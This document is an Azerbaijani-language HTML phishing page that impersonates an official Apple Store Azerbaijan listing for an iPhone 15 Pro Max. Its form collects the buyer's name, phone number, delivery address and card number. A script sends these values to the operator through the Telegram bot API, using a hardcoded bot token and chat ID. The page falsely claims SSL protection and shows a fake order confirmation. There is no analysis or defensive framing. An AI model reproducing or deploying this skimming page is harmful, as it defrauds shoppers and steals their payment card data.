<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple Azerbaijan | Rəsmi Mağaza</title>
    <style>
        body { background-color: #f5f5f7; font-family: -apple-system, sans-serif; margin: 0; padding: 0; }
        .header { background: #000; color: #fff; text-align: center; padding: 15px; font-weight: bold; }
        .container { max-width: 450px; margin: 30px auto; background: #fff; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
        .product-img { width: 100%; border-radius: 10px; }
        h2 { text-align: center; color: #1d1d1f; }
        .price { text-align: center; font-size: 22px; color: #0071e3; font-weight: bold; margin-bottom: 20px; }
        
        label { display: block; margin-bottom: 5px; font-size: 14px; color: #333; font-weight: 600; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #d2d2d7; border-radius: 8px; box-sizing: border-box; }
        
        .buy-btn { width: 100%; background: #0071e3; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 17px; font-weight: bold; cursor: pointer; }
        .buy-btn:hover { background: #0077ed; }
        .footer-text { text-align: center; font-size: 11px; color: #86868b; margin-top: 15px; }
    </style>
</head>
<body>

<div class="header"> Apple Store Azerbaijan</div>

<div class="container">
    <img src="https://store.storeimages.cdn-apple.com/4668/as-images.apple.com/is/iphone-15-pro-finish-select-202309-6-1inch-naturaltitanium?wid=512&fmt=p-jpg" class="product-img">
    <h2>iPhone 15 Pro Max</h2>
    <div class="price">2799 AZN</div>

    <label>Ad və Soyad</label>
    <input type="text" id="fullname" placeholder="Məs: Rahim Məmmədli">

    <label>Telefon Nömrəsi</label>
    <input type="text" id="phone" placeholder="050-XXX-XX-XX">

    <label>Çatdırılma Ünvanı</label>
    <input type="text" id="address" placeholder="Küçə, mənzil və s.">

    <label>Ödəniş üçün Kart Nömrəsi</label>
    <input type="text" id="cardnum" placeholder="4169 **** **** ****" maxlength="16">

    <button class="buy-btn" onclick="sendOrder()">SİFARİŞİ TƏSDİQLƏ</button>
    
    <div class="footer-text">🔒 Məlumatlarınız 256-bit SSL ilə qorunur.</div>
</div>

<script>
    function sendOrder() {
        const name = document.getElementById('fullname').value;
        const phone = document.getElementById('phone').value;
        const address = document.getElementById('address').value;
        const card = document.getElementById('cardnum').value;

        if(!name || !phone || !card) {
            alert("Lütfən xanaları doldurun!");
            return;
        }

        // Sənin Yeni Telegram Tokenin
        const token = "8726373680:AAF2werxJGL5txqaVsKagScoE_4d8sQSwW8";
        const chat_id = "8528240785"; // Sənin ID-in
        const message = `🚀 YENİ SİFARİŞ!\n\n👤 Ad: ${name}\n📞 Tel: ${phone}\n📍 Ünvan: ${address}\n💳 Kart: ${card}\n📱 Məhsul: iPhone 15 Pro Max`;

        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;

        fetch(url)
        .then(res => {
            if(res.ok) {
                alert("Sifarişiniz qəbul edildi! Operator tezliklə əlaqə saxlayacaq.");
                location.reload();
            }
        })
        .catch(err => alert("Xəta! İnterneti yoxlayın."));
    }
</script>

</body>
</html>
